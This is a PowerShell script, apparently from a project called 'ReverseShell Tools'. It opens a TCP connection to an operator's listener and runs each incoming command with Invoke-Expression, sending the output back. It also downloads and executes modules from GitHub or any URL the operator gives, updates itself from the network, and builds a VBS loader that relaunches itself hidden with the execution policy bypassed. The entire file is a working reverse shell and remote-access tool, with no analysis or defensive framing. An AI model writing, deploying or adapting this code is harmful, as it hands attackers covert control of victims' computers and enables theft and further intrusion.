#1.2

try { Get-Content -Path ((Get-Item $PSCommandPath).DirectoryName + "\listener.txt") -ErrorAction Stop | ForEach-Object { $server = $_ } }
catch
{
	New-Item "listener.txt" | ForEach-Object { Write-Host "Can't find listener.txt file, creating it..." }
	$server = ""
}
while ($server -in @($null, "")) { $server = Read-Host "Enter listener IP and Port! [x.x.x.x:xxxxx]"; Add-Content -Value $server -Path "listener.txt" }

Write-Host ("Connecting to " + $server.Replace("'", "").Replace(",", ":").Replace(" ", ""))

$server = $server.Split(":")
$ip = $server[0]
$port = $server[1]

while ($TCPClient.Connected -ne "True")
{
	Start-Sleep -Seconds 1
	try
	{
		Invoke-Expression ('$TCPClient' + "= New-Object Net.Sockets.TCPClient('$ip', $port)")
	}
	catch { }
}

Write-Host "Sucessfully Connected!"

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function WriteTCPMessage ([string]$String, [switch]$NoCommand, [switch]$NoNewLine)
{
	[byte[]]$script:Buffer = 0 .. $TCPClient.ReceiveBufferSize | ForEach-Object { 0 }
	
	if (-not ($NoCommand -or $NoNewLine)) { $sendmessage = ($String + "`n[PS] > ") }
	if ($NoCommand -and -not $NoNewLine) { $sendmessage = "`n$String" }
	if ($NoNewLine -and -not $NoCommand) { $sendmessage = ($String + "`n[PS] > ") }
	if ($NoCommand -and $NoNewLine) { $sendmessage = "$String" }
	
	$StreamWriter.Write($sendmessage)
	$StreamWriter.Flush()
	
	Write-Host $String
}

WriteTCPMessage "
      _____       __  _______ 
     |  __ \     / / |__   __|
     | |__) |   / /_    | |   
     |  _  /   /_  /    | |   
     | | \ \    / /     | |   
     |_|  \_\  /_/      |_|   

 ReverseShell Tools by UltraAlex0
 " -NoCommand
#ModuleParser

WriteTCPMessage "[ModuleParser v2.0]" -NoCommand
WriteTCPMessage "Searching For Modules...`n`n" -NoCommand
try { $modulelist = Get-ChildItem ("$PSScriptRoot\modules") "*.function" -ErrorAction Stop }
catch { New-Item -Path $PSScriptRoot -Name "modules" -ItemType "Directory" }
if ($modulelist -eq $null) { WriteTCPMessage "`nNo Modules Found!`n" }
else
{
	foreach ($module in $modulelist)
	{
		$moduleinfo = Get-Content "$PSScriptRoot\modules\$module"
		$loadname = ($moduleinfo | Select-String "#n " | Out-String).Replace("#n ", "").Trim()
		$versionname = ($moduleinfo | Select-String "#v " | Out-String).Replace("#v ", "").Trim()
		$afterload += ($moduleinfo | Select-String "#load " | Out-String).Replace("#load ", "").Trim()
		
		try
		{
			if (!([bool]$loadname -and [bool]$versionname)) { Write-Error "" -ErrorAction Stop }
			WriteTCPMessage ("loading $loadname v$versionname...") -NoCommand -NoNewLine
			
			Invoke-Expression ([string](Get-Content "$PSScriptRoot\modules\$module" -Raw)) -ErrorAction Stop
			foreach ($hStart in ($moduleinfo | Select-String "#hStart ").LineNumber)
			{
				$loadedmodules += @{ ($moduleinfo[($hStart - 1)] | Out-String).Replace("#hStart ", "").Trim() = ($moduleinfo[$hStart .. ((($moduleinfo | Select-String "#hEnd").LineNumber | Where-Object { $_ -gt $hStart } | Select-Object -First 1) - 2)]).Replace("#", "") }
			}
			WriteTCPMessage "OK`n" -NoCommand -NoNewLine
		}
		catch { WriteTCPMessage "Error Parsing Module!`n" -NoCommand -NoNewLine }
	}
	WriteTCPMessage ("Sucessfully Loaded " + $loadedmodules.Count + " Module(s)!`n") -NoCommand
	
	$afterload | ForEach-Object { Invoke-Expression $_ }
}
Remove-Variable module, moduleinfo, loadname, versionname, hStart -ErrorAction SilentlyContinue

function RunModule ($Action)
{
	$SplitAction = $Action.Split()
	
	#/server
	if ($SplitAction[0] -eq "server")
	{
		if ($SplitAction[1] -eq "set")
		{
			if ($SplitAction[2] -ne $null)
			{
				Clear-Content -Path "listener.txt"
				Add-Content -Value $SplitAction[2] -Path "listener.txt"
				WriteTCPMessage "`nSucessfully Set Server!`n"
			}
			else { WriteTCPMessage "`nEnter listener IP and Port! [x.x.x.x:xxxxx]`n" }
			
		}
		else { WriteTCPMessage ("`n" + (Get-Content $PSScriptRoot\listener.txt) + "`n") }
	}
	#/module
	if ($SplitAction[0] -eq "module")
	{
		if ($SplitAction[1] -eq "store")
		{
			foreach ($module in (Invoke-RestMethod -Uri "https://api.github.com/repos/UltraAlex00/reverseshell-tools/contents/modules") | Select-Object -ExpandProperty name)
			{
				if ($module -in (Get-ChildItem $PSScriptRoot\modules *.function).Name) { WriteTCPMessage ($module.Replace(".function", "") + "   -   Installed") -NoCommand }
				else { WriteTCPMessage $module.Replace(".function", "") -NoCommand }
			}
			WriteTCPMessage "`n"
		}
		if ($SplitAction[1] -eq "list")
		{
			if ((Get-ChildItem $PSScriptRoot\modules *.function) -ne $null)
			{
				WriteTCPMessage ("`n" + ([string]((Get-ChildItem $PSScriptRoot\modules).Name)).Replace(" ", "`n").Replace(".function", "") + "`n")
			}
			else { WriteTCPMessage "`nNo Modules Found!`n" }
		}
		if ($SplitAction[1] -eq "add")
		{
			if ($SplitAction[2] -in ((Invoke-RestMethod -Uri "https://api.github.com/repos/UltraAlex00/reverseshell-tools/contents/modules") | Select-Object -ExpandProperty name).Replace(".function", ""))
			{
				if (-not (Test-Path ("$PSScriptRoot\modules\" + $SplitAction[2] + ".function")))
				{
					Invoke-WebRequest -Uri ("https://raw.githubusercontent.com/UltraAlex00/reverseshell-tools/main/modules/" + $SplitAction[2] + ".function") -OutFile ("$PSScriptRoot\modules\" + $SplitAction[2] + ".function")
					WriteTCPMessage "`n" + $SplitAction[2] + "Installed Sucessfully!`n"
				}
				else { WriteTCPMessage "`nModule Allready Installed!`n" }
			}
			else
			{
				try
				{
					Invoke-WebRequest -Uri $SplitAction[2] -OutFile ("$PSScriptRoot\modules\" + $SplitAction[3] + ".function")
					WriteTCPMessage "`nSucessfully Downloaded!`n"
				}
				catch
				{
					if ($SplitAction[2] -eq $null) { WriteTCPMessage "`nInput Requested Module or Uri`n" }
					elseif ($SplitAction[3] -eq $null) { WriteTCPMessage "`nInput ModuleName!`n" }
					else { WriteTCPMessage "`nDownload Failed!`n" }
				}
			}
		}
		if ($SplitAction[1] -eq "remove")
		{
			try
			{
				Remove-Item ("$PSScriptRoot\modules\" + $SplitAction[2] + ".function") -Force
				WriteTCPMessage ("`nSucessfully Removed" + $SplitAction[2] + "`n")
			}
			catch
			{
				if ($SplitAction[2] -eq $null) { WriteTCPMessage "`nEnter Module Name!`n" }
				else { WriteTCPMessage "`nModule Not Found!`n" }
			}
		}
		
		if ($SplitAction[1] -notin @("store", "list", "add", "remove")) { WriteTCPMessage "`nInvalid Command!`n" }
	}
	#/ver
	if ($SplitAction[0] -eq "ver")
	{
		if ($SplitAction[1] -eq $null) { WriteTCPMessage ("`nVersion: " + (Get-Content $PSCommandPath -TotalCount 1).Substring(1) + "`nNewest: " + (([string](Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UltraAlex00/reverseshell-tools/main/active.ps1").Content).Split()[0]).Substring(1) + "`n") }
		elseif ($SplitAction[1] -eq "update")
		{
			try
			{
				WriteTCPMessage "`nUpdating..." -NoCommand -NoNewLine
				$oldpath = $PSCommandPath
				Remove-Item $PSCommandPath -Force
				Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UltraAlex00/reverseshell-tools/main/active.ps1" -OutFile $oldpath
				WriteTCPMessage "OK`n" -NoNewLine
			}
			catch { WriteTCPMessage "Update Failed!`n" }
		}
	}
	#/restart
	if ($SplitAction[0] -eq "restart")
	{
		try { Get-Item "$PSScriptRoot\loader.vbs" -ErrorAction Stop }
		catch
		{
			$loaderbuilder = 'CreateObject("WScript.Shell").Run "powershell -ExecutionPolicy bypass -file """ & CreateObject("WScript.Shell").CurrentDirectory & "\active.ps1""", 0'
			New-Item -Path ((Get-Item $PSCommandPath).DirectoryName + "\loader.vbs") -Value $loaderbuilder
		}
		3 .. 1 | ForEach-Object { WriteTCPMessage "`nRestarting in $_ s" -NoCommand; Start-Sleep 1 }
		wscript "$PSScriptRoot\loader.vbs"
		exit
	}
	
	#/help
	if ($SplitAction[0] -eq "help")
	{
		if ($SplitAction[1] -eq $null)
		{
			WriteTCPMessage "
Internal:

/server - shows the listener IP
	<set> [IP:PORT] - sets the server

/module
	[store] - shows all modules on advible on git
	[list] - shows all modules in the modules folder
	[add] [ModuleName / Uri] - downloads a module
	[remove] [ModuleName] - removes a module

/ver - shows yours and the newest version
	<update> - updates to the latest version

/restart - restarts the script
	 - ends the connection but starts a new one

External:
" -NoCommand
			WriteTCPMessage ((Invoke-Command { foreach ($moduleindex in $loadedmodules.Keys) { ("`n/" + $moduleindex + " " + ($loadedmodules[$moduleindex].Split("`n") -join "`n") + "`n") } }))
		}
		else
		{
			try { WriteTCPMessage ("`n/" + $SplitAction[1] + " " + ($loadedmodules[$SplitAction[1]].Split("`n") -join "`n") + "`n") }
			catch { WriteTCPMessage "Module Not Found!`n" }
		}
	}
	#loaded modules
	if ($SplitAction[0] -notin @("server", "module", "ver", "help", "restart"))
	{
		if ($SplitAction[0] -in $loadedmodules.Keys)
		{
			Invoke-Expression ([string]$SplitAction)
		}
		else { WriteTCPMessage "`nInvalid Command!`n" }
	}
}
WriteTCPMessage ''

while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0)
{
	$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
	try
	{
		if ($Command.Substring(0, 1) -eq "/") { RunModule $Command.Substring(1) }
		elseif ($Command -in $loadedmodules.Keys) {WriteTCPMessage "`nRun With '/' As Prefix`n"}
		else
		{
			$Output = try
			{
				Invoke-Expression $Command 2>&1 | Out-String
			}
			catch
			{
				$_ | Out-String
			}
			WriteTCPMessage ($Output)
		}
	}
	catch { WriteTCPMessage "" -NoNewLine }
}
$StreamWriter.Close()
Clear-Host
